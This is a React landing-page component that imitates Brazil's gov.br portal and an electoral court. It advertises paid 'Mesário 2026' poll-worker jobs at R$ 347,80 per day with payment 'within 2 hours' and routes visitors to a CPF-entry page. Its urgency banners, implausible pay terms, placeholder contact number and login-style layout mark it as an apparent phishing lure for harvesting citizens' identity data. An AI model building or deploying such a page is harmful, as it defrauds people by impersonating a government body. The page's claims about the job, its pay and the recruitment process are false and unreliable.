export default function Landing() {
  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            {/* Banner principal */}
            <div
              style={{
                backgroundColor: "#1351B4",
                padding: "30px 20px",
                borderRadius: "8px 8px 0 0",
                marginBottom: "20px",
                textAlign: "center",
                color: "white",
              }}
            >
              <h1 style={{ margin: 0, fontSize: "28px", fontWeight: "bold" }}>
                VAGAS ABERTAS
              </h1>
              <h2 style={{ margin: "10px 0 0 0", fontSize: "24px" }}>
                MESÁRIO 2026
              </h2>
              <p style={{ margin: "10px 0 0 0", fontSize: "14px", opacity: 0.9 }}>
                Eleições 2026 • Tribunal Regional Eleitoral
              </p>
            </div>

            {/* Valor em destaque */}
            <div
              style={{
                backgroundColor: "#FFCD07",
                padding: "25px",
                borderRadius: "8px",
                marginBottom: "25px",
                textAlign: "center",
                border: "3px solid #F7B500",
              }}
            >
              <p style={{ margin: 0, fontSize: "16px", color: "#333", fontWeight: "500" }}>
                Remuneração por dia trabalhado:
              </p>
              <h3
                style={{
                  margin: "10px 0 0 0",
                  fontSize: "48px",
                  fontWeight: "bold",
                  color: "#1351B4",
                  lineHeight: "1",
                }}
              >
                R$ 347,80
              </h3>
            </div>

            {/* Informações sobre a vaga */}
            <div style={{ marginBottom: "25px" }}>
              <h3
                style={{
                  color: "#1351B4",
                  fontSize: "20px",
                  marginBottom: "15px",
                  borderBottom: "2px solid #1351B4",
                  paddingBottom: "10px",
                }}
              >
                📋 Sobre a Vaga
              </h3>

              <div style={{ marginBottom: "15px" }}>
                <p style={{ margin: "0 0 8px 0", fontSize: "15px", color: "#333" }}>
                  <strong>Função:</strong> Mesário 2
                </p>
                <p style={{ margin: "0 0 8px 0", fontSize: "15px", color: "#333" }}>
                  <strong>Data prevista:</strong> 01/03/2026 (Final de Semana)
                </p>
                <p style={{ margin: "0 0 8px 0", fontSize: "15px", color: "#333" }}>
                  <strong>Carga horária:</strong> 1 dia de trabalho
                </p>
                <p style={{ margin: "0", fontSize: "15px", color: "#333" }}>
                  <strong>Local:</strong> Definido conforme sua zona eleitoral
                </p>
              </div>
            </div>

            {/* Benefícios */}
            <div style={{ marginBottom: "25px" }}>
              <h3
                style={{
                  color: "#168821",
                  fontSize: "20px",
                  marginBottom: "15px",
                  borderBottom: "2px solid #168821",
                  paddingBottom: "10px",
                }}
              >
                ✓ Benefícios
              </h3>

              <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
                <div
                  style={{
                    display: "flex",
                    alignItems: "flex-start",
                    gap: "10px",
                    padding: "12px",
                    backgroundColor: "#f0f8f0",
                    borderRadius: "5px",
                    border: "1px solid #c8e6c9",
                  }}
                >
                  <span style={{ fontSize: "20px", color: "#168821" }}>✓</span>
                  <p style={{ margin: 0, fontSize: "14px", color: "#2e7d32" }}>
                    <strong>Remuneração imediata:</strong> Primeira parcela creditada em até 2 horas úteis após confirmação
                  </p>
                </div>

                <div
                  style={{
                    display: "flex",
                    alignItems: "flex-start",
                    gap: "10px",
                    padding: "12px",
                    backgroundColor: "#f0f8f0",
                    borderRadius: "5px",
                    border: "1px solid #c8e6c9",
                  }}
                >
                  <span style={{ fontSize: "20px", color: "#168821" }}>✓</span>
                  <p style={{ margin: 0, fontSize: "14px", color: "#2e7d32" }}>
                    <strong>Atestado para trabalho:</strong> Documento oficial fornecido para justificar ausência
                  </p>
                </div>

                <div
                  style={{
                    display: "flex",
                    alignItems: "flex-start",
                    gap: "10px",
                    padding: "12px",
                    backgroundColor: "#f0f8f0",
                    borderRadius: "5px",
                    border: "1px solid #c8e6c9",
                  }}
                >
                  <span style={{ fontSize: "20px", color: "#168821" }}>✓</span>
                  <p style={{ margin: 0, fontSize: "14px", color: "#2e7d32" }}>
                    <strong>Apenas 1 dia:</strong> Trabalho em final de semana, sem comprometer sua rotina
                  </p>
                </div>

                <div
                  style={{
                    display: "flex",
                    alignItems: "flex-start",
                    gap: "10px",
                    padding: "12px",
                    backgroundColor: "#f0f8f0",
                    borderRadius: "5px",
                    border: "1px solid #c8e6c9",
                  }}
                >
                  <span style={{ fontSize: "20px", color: "#168821" }}>✓</span>
                  <p style={{ margin: 0, fontSize: "14px", color: "#2e7d32" }}>
                    <strong>Contribuição cidadã:</strong> Participe ativamente do processo democrático brasileiro
                  </p>
                </div>
              </div>
            </div>

            {/* Atribuições */}
            <div style={{ marginBottom: "25px" }}>
              <h3
                style={{
                  color: "#1351B4",
                  fontSize: "20px",
                  marginBottom: "15px",
                  borderBottom: "2px solid #1351B4",
                  paddingBottom: "10px",
                }}
              >
                📝 Atribuições do Mesário 2
              </h3>

              <ul style={{ paddingLeft: "20px", margin: 0 }}>
                <li style={{ marginBottom: "8px", fontSize: "14px", color: "#333" }}>
                  Auxiliar na identificação dos eleitores
                </li>
                <li style={{ marginBottom: "8px", fontSize: "14px", color: "#333" }}>
                  Conferir documentos de identificação
                </li>
                <li style={{ marginBottom: "8px", fontSize: "14px", color: "#333" }}>
                  Orientar eleitores sobre o processo de votação
                </li>
                <li style={{ marginBottom: "8px", fontSize: "14px", color: "#333" }}>
                  Auxiliar no controle de fluxo da seção eleitoral
                </li>
                <li style={{ marginBottom: "0", fontSize: "14px", color: "#333" }}>
                  Participar da apuração e fechamento da seção
                </li>
              </ul>
            </div>

            {/* Requisitos */}
            <div style={{ marginBottom: "25px" }}>
              <h3
                style={{
                  color: "#1351B4",
                  fontSize: "20px",
                  marginBottom: "15px",
                  borderBottom: "2px solid #1351B4",
                  paddingBottom: "10px",
                }}
              >
                📌 Requisitos
              </h3>

              <ul style={{ paddingLeft: "20px", margin: 0 }}>
                <li style={{ marginBottom: "8px", fontSize: "14px", color: "#333" }}>
                  Ter entre 18 e 70 anos
                </li>
                <li style={{ marginBottom: "8px", fontSize: "14px", color: "#333" }}>
                  Estar em dia com a Justiça Eleitoral
                </li>
                <li style={{ marginBottom: "8px", fontSize: "14px", color: "#333" }}>
                  Possuir CPF ativo
                </li>
                <li style={{ marginBottom: "0", fontSize: "14px", color: "#333" }}>
                  Disponibilidade para o dia 01/03/2026
                </li>
              </ul>
            </div>

            {/* Aviso de vagas limitadas */}
            <div
              style={{
                backgroundColor: "#fff3cd",
                padding: "15px",
                borderRadius: "8px",
                marginBottom: "25px",
                border: "2px solid #ffc107",
                textAlign: "center",
              }}
            >
              <p style={{ margin: 0, fontSize: "15px", color: "#856404" }}>
                <strong>⚠️ ATENÇÃO:</strong> Vagas limitadas por região!
                <br />
                Inscreva-se agora para garantir sua participação.
              </p>
            </div>

            {/* Botão de inscrição */}
            <div className="button-panel" style={{ textAlign: "center" }}>
              <button
                className="button-continuar"
                onClick={() => (window.location.href = "/cpf")}
                style={{
                  backgroundColor: "#168821",
                  fontSize: "18px",
                  fontWeight: "bold",
                  padding: "18px 40px",
                  textAlign: "center",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  margin: "0 auto",
                }}
              >
                INSCREVA-SE AGORA →
              </button>
            </div>

            <p
              style={{
                marginTop: "15px",
                fontSize: "12px",
                color: "#999",
                textAlign: "center",
              }}
            >
              Processo rápido e 100% online • Confirmação imediata
            </p>

            {/* Rodapé com informações legais */}
            <div
              style={{
                marginTop: "30px",
                padding: "15px",
                backgroundColor: "#fafafa",
                borderRadius: "5px",
                border: "1px solid #e0e0e0",
              }}
            >
              <p
                style={{
                  margin: 0,
                  fontSize: "11px",
                  color: "#666",
                  lineHeight: "1.5",
                  textAlign: "center",
                }}
              >
                <strong>Tribunal Regional Eleitoral</strong>
                <br />
                Processo de recrutamento conforme Resolução TSE nº 23.659/2021
                <br />
                Dúvidas: 0800-xxx-xxxx | atendimento@tre.gov.br
              </p>
            </div>
          </div>
        </main>
      </div>

      <footer></footer>
    </>
  );
}
